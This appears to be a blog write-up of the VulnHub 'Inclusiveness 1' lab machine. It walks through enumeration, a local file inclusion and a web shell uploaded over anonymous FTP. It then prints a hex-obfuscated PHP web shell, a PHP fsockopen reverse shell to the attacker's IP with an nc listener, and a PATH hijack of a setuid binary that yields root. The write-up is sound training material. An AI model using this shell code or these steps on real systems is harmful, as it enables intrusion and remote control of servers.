---
layout: post
author: H4
---

[Details](https://www.vulnhub.com/entry/inclusiveness-1,422/)

# discovery

Starting with a simple `nmap` scan to identify the attack surface of the target.

## nmap
```bash
$ nmap -Pn -sV 192.168.124.14
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-09 10:28 EST
Nmap scan report for 192.168.124.14
Host is up (0.10s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.51 seconds
```

## FTP (port 21)
> Anonymous access allowed and file write is possible
{: .prompt-tip }

## SSH (port 22)
No vulnerabilities identified.

## web server (port 80)
```bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://192.168.124.14/
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.124.14/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/01/09 10:32:09 Starting gobuster in directory enumeration mode
===============================================================
/manual               (Status: 301) [Size: 317] [--> http://192.168.124.14/manual/]
/javascript           (Status: 301) [Size: 321] [--> http://192.168.124.14/javascript/]
/robots.txt           (Status: 200) [Size: 59]                                         
                                                                                       
===============================================================
2022/01/09 10:46:58 Finished
===============================================================
```
> `robots.txt` revealed
{: .prompt-info }

---

# exploitation
## robots.txt

Let us first have a look what the content of the `robots.txt` is.

### request
```http
GET /robots.txt HTTP/1.1
Host: 192.168.124.14
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

```

### response
```http
HTTP/1.1 200 OK
Date: Sun, 09 Jan 2022 15:47:53 GMT
Server: Apache/2.4.38 (Debian)
Vary: User-Agent
Last-Modified: Sat, 08 Feb 2020 03:40:29 GMT
ETag: "3b-59e084481655e"
Accept-Ranges: bytes
Content-Length: 59
Connection: close
Content-Type: text/html

You are not a search engine! You can't read my robots.txt!
```

It seems that the server is checking if we are a search engine.  
In the next step we try to access the `robots.txt` file with different `user-agent` parameters to check if one of them is a valid search engine.

### identifying a valid (search engine) user-agent string
List of search engine user-agent strings from Google.
```
Mozilla/5.0 (compatible; bingbot/2.0 +http://www.bing.com/bingbot.htm)
Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 530) like Gecko (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
msnbot/2.0b (+http://search.msn.com/msnbot.htm)
msnbot-media/1.1 (+http://search.msn.com/msnbot.htm)
Mozilla/5.0 (compatible; adidxbot/2.0; +http://www.bing.com/bingbot.htm)
Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; adidxbot/2.0; +http://www.bing.com/bingbot.htm)
Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 530) like Gecko (compatible; adidxbot/2.0; +http://www.bing.com/bingbot.htm)
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b
Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 530) like Gecko BingPreview/1.0b
DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)
Googlebot/2.1 (+http://www.googlebot.com/bot.html)
Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Googlebot/2.1 (+http://www.google.com/bot.html)
Googlebot-News
Googlebot-Image/1.0
Googlebot-Video/1.0
SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)
DoCoMo/2.0 N905i(c100;TB;W24H16) (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)
Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
[various mobile device types] (compatible; Mediapartners-Google/2.1; +http://www.google.com/bot.html)
Mediapartners-Google
AdsBot-Google (+http://www.google.com/adsbot.html)
Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)
Mozilla/5.0 (iPhone; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B411 Safari/600.1.4 (compatible; YandexBot/3.0; +http://yandex.com/bots)
Mozilla/5.0 (compatible; YandexAccessibilityBot/3.0; +http://yandex.com/bots)
Mozilla/5.0 (iPhone; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B411 Safari/600.1.4 (compatible; YandexMobileBot/3.0; +http://yandex.com/bots)
Mozilla/5.0 (compatible; YandexDirectDyn/1.0; +http://yandex.com/bots
Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)
Mozilla/5.0 (compatible; YandexVideo/3.0; +http://yandex.com/bots)
Mozilla/5.0 (compatible; YandexMedia/3.0; +http://yandex.com/bots)
Mozilla/5.0 (compatible; YandexBlogs/0.99; robot; +http://yandex.com/bots)
Mozilla/5.0 (compatible; YandexFavicons/1.0; +http://yandex.com/bots)
Mozilla/5.0 (compatible; YandexWebmaster/2.0; +http://yandex.com/bots)
Mozilla/5.0 (compatible; YandexPagechecker/1.0; +http://yandex.com/bots)
Mozilla/5.0 (compatible; YandexImageResizer/2.0; +http://yandex.com/bots)
Mozilla/5.0 (compatible; YaDirectFetcher/1.0; Dyatel; +http://yandex.com/bots)
Mozilla/5.0 (compatible; YandexCalendar/1.0; +http://yandex.com/bots)
Mozilla/5.0 (compatible; YandexSitelinks; Dyatel; +http://yandex.com/bots)
Mozilla/5.0 (compatible; YandexMetrika/3.0; +http://yandex.com/bots)
Mozilla/5.0 (compatible; YandexAntivirus/2.0; +http://yandex.com/bots)
Mozilla/5.0 (compatible; YandexVertis/3.0; +http://yandex.com/bots)
Mozilla/5.0 (compatible; YandexBot/3.0; MirrorDetector; +http://yandex.com/bots)
```

Used `burp intruder` to identify a valid string.
Alternatively you can use free tools like `wfuzz` to do this task.
> `Googlebot/2.1 (+http://www.googlebot.com/bot.html)`
{: .prompt-tip }

### requesting robots.txt content
#### request
```http
GET /robots.txt HTTP/1.1
Host: 192.168.124.14
Upgrade-Insecure-Requests: 1
User-Agent: Googlebot/2.1 (+http://www.googlebot.com/bot.html)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

```
#### response
```http
HTTP/1.1 200 OK
Date: Sun, 09 Jan 2022 15:56:50 GMT
Server: Apache/2.4.38 (Debian)
Last-Modified: Sat, 08 Feb 2020 03:26:11 GMT
ETag: "2d-59e08115bb1ef"
Accept-Ranges: bytes
Content-Length: 45
Connection: close
Content-Type: text/plain

User-agent: *
Disallow: /secret_information/
```

So, there is a hidden folder namend `/secret_information`. Let us request the content.

## requesting /secret_information/
### request
```http
GET /secret_information/ HTTP/1.1
Host: 192.168.124.14
Upgrade-Insecure-Requests: 1
User-Agent: asd
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

```
### response
```http
HTTP/1.1 200 OK
Date: Sun, 09 Jan 2022 15:57:38 GMT
Server: Apache/2.4.38 (Debian)
Vary: Accept-Encoding
Content-Length: 1477
Connection: close
Content-Type: text/html; charset=UTF-8

<title>zone transfer</title>

<h2>DNS Zone Transfer Attack</h2>

<p><a href='?lang=en.php'>english</a> <a href='?lang=es.php'>spanish</a></p>
...
```

The response tells us that there is a parameter named `lang` available which is used to include a `php` file.
In the following we try to exploit this by testing for a `local file inclusion` (`lfi`) 

## test for directory traversal and lfi
### request
```http
GET /secret_information/?lang=/etc/passwd HTTP/1.1
Host: 192.168.124.14
Upgrade-Insecure-Requests: 1
User-Agent: asd
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

```

### response
```http
HTTP/1.1 200 OK
Date: Sun, 09 Jan 2022 15:59:23 GMT
Server: Apache/2.4.38 (Debian)
Vary: Accept-Encoding
Content-Length: 2191
Connection: close
Content-Type: text/html; charset=UTF-8

<title>zone transfer</title>

<h2>DNS Zone Transfer Attack</h2>

<p><a href='?lang=en.php'>english</a> <a href='?lang=es.php'>spanish</a></p>

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
avahi-autoipd:x:107:114:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
avahi:x:113:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:x:114:121::/var/lib/saned:/usr/sbin/nologin
colord:x:115:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:116:123::/var/lib/geoclue:/usr/sbin/nologin
tom:x:1000:1000:Tom,,,:/home/tom:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ftp:x:118:125:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
```
> Directory traversal vulnerability confirmed!
{: .prompt-tip }

Now let us test if it is also possible to load a `PHP` file and get it interpreted by trying a `webshell` upload.

## escalating to web shell
### uploading a webshell via anonymous ftp access
```php
<?php

$pass = "9cdfb439c7876e703e307864c9167a15"; //lol 

$A = chr(0x73);
$B = chr(0x79);
$X = chr(0x74);
$D = chr(0x65);
$E = chr(0x6d);

$hook = $A.$B.$A.$X.$D.$E;

if($pass == md5($_POST['password']))
{
  $hook($_POST['cmd']);
}
else
{
  die();
}

?>
```
> When uploading to a `vsftpd 3.0.3` server the default upload folder is `/var/ftp/pub/`
{: .prompt-info }

### trigger the web shell
payload: `/var/ftp/pub/shell.php&cmd=whoami&password=lol`

#### request
```http
POST /secret_information/ HTTP/1.1
Host: 192.168.124.14
Upgrade-Insecure-Requests: 1
User-Agent: asd
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 51

lang=/var/ftp/pub/shell.php&cmd=whoami&password=lol
```

#### response
```http
HTTP/1.1 200 OK
Date: Sun, 09 Jan 2022 16:05:14 GMT
Server: Apache/2.4.38 (Debian)
Vary: Accept-Encoding
Content-Length: 155
Connection: close
Content-Type: text/html; charset=UTF-8

<title>zone transfer</title>

<h2>DNS Zone Transfer Attack</h2>

<p><a href='?lang=en.php'>english</a> <a href='?lang=es.php'>spanish</a></p>

www-data
```
Yay! Shell!

### getting a reverse shell
- payload: ```php -r '$sock=fsockopen("192.168.49.124",445);exec("/bin/sh -i <&3 >&3 2>&3");'```

#### start listener on the attacker machine
```bash
nc -lvp 445
listening on [any] 445 ...
```

#### request
```http
POST /secret_information/ HTTP/1.1
Host: 192.168.124.14
Upgrade-Insecure-Requests: 1
User-Agent: asd
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 282

lang=/var/ftp/pub/shell.php&cmd=%70%68%70%20%2d%72%20%27%24%73%6f%63%6b%3d%66%73%6f%63%6b%6f%70%65%6e%28%22%31%39%32%2e%31%36%38%2e%34%39%2e%31%32%34%22%2c%34%34%35%29%3b%65%78%65%63%28%22%2f%62%69%6e%2f%73%68%20%2d%69%20%3c%26%33%20%3e%26%33%20%32%3e%26%33%22%29%3b%27txt
&password=lol
```

#### catch connect from target
```bash
nc -lvp 445
listening on [any] 445 ...
192.168.124.14: inverse host lookup failed: Unknown host
connect to [192.168.49.124] from (UNKNOWN) [192.168.124.14] 52638
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data

```

## get first flag
```bash
nc -lvp 445
listening on [any] 445 ...
192.168.124.14: inverse host lookup failed: Unknown host
connect to [192.168.49.124] from (UNKNOWN) [192.168.124.14] 52638
/bin/sh: 0: can't access tty; job control turned off
$ cd /home/tom
$ cat local.txt
e******************************3
```
---

# post exploitation
## get root
### /home/tom folder content
```bash
$ ls -lsah
total 104K
4.0K drwxr-xr-x 15 tom  tom  4.0K Jan 10 01:24 .
4.0K drwxr-xr-x  3 root root 4.0K Feb  8  2020 ..
4.0K -rw-------  1 tom  tom   684 Feb  8  2020 .ICEauthority
   0 -rw-r--r--  1 root root    0 Jul 16  2020 .bash_history
4.0K -rw-r--r--  1 tom  tom   220 Feb  8  2020 .bash_logout
4.0K -rw-r--r--  1 tom  tom  3.5K Feb  8  2020 .bashrc
4.0K drwx------ 10 tom  tom  4.0K Feb  8  2020 .cache
4.0K drwx------ 10 tom  tom  4.0K Feb  8  2020 .config
4.0K drwx------  3 tom  tom  4.0K Feb  8  2020 .gnupg
4.0K drwx------  3 tom  tom  4.0K Feb  8  2020 .local
4.0K -rw-r--r--  1 tom  tom   807 Feb  8  2020 .profile
4.0K drwx------  2 tom  tom  4.0K Feb  8  2020 .ssh
4.0K drwxr-xr-x  2 tom  tom  4.0K Feb  8  2020 Desktop
4.0K drwxr-xr-x  2 tom  tom  4.0K Feb  8  2020 Documents
4.0K drwxr-xr-x  2 tom  tom  4.0K Feb  8  2020 Downloads
4.0K drwxr-xr-x  2 tom  tom  4.0K Feb  8  2020 Music
4.0K drwxr-xr-x  2 tom  tom  4.0K Feb  8  2020 Pictures
4.0K drwxr-xr-x  2 tom  tom  4.0K Feb  8  2020 Public
4.0K drwxr-xr-x  2 tom  tom  4.0K Feb  8  2020 Templates
4.0K drwxr-xr-x  2 tom  tom  4.0K Feb  8  2020 Videos
4.0K -rw-r--r--  1 root root   33 Jan 10 01:24 local.txt
 20K -rwsr-xr-x  1 root root  17K Feb  8  2020 rootshell
4.0K -rw-r--r--  1 tom  tom   448 Feb  8  2020 rootshell.c
```
`rootshell` has flag set that it gets executed as the owner of the file!

> Source code of `rootshell` is available.
{: .prompt-info }

### exploit rootshell file
#### test execute
```bash
$ ./rootshell
checking if you are tom...
you are: www-data
```

We somehow need to fake our current user.

#### source code of rootshell
```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main() {

    printf("checking if you are tom...\n");
    FILE* f = popen("whoami", "r");

    char user[80];
    fgets(user, 80, f);

    printf("you are: %s\n", user);
    //printf("your euid is: %i\n", geteuid());

    if (strncmp(user, "tom", 3) == 0) {
        printf("access granted.\n");
	setuid(geteuid());
        execlp("sh", "sh", (char *) 0);
    }
}
```
Program checks if the current user is `tom`. if this is the case the pogram allows to execute commands with root privileges.  
As we are `www-data` data we first need to be `tom` or make the program believe we are `tom`.  
The program just performs a `whoami` and reads the response.  
> As the program does not execute `whoami` from its absolute path,  we just can create a program which prints `tom`, call it `whoami` and adding the folder where it is stored (e.g. `tmp`) in front of the `$PATH` variable.
{: .prompt-tip }

### create the fake `whoami`
```bash
$ cd /tmp
$ print "printf 'tom'" > whoami
$ chmod +x whoami
```

### add the fake `whoami` at the beginning of the current path environment
```bash
$ export PATH=/tmp:$PATH
```

### execute `rootshell` and get the second flag
```bash
$ cd /home/tom
$ ./rootshell
checking if you are tom...
you are: tom
access granted.
# cd /root
cd /root
# ls
ls
flag.txt  proof.txt
# cat proof.txt
cat proof.txt
c*******************************b
```

Pwned! <@:-)
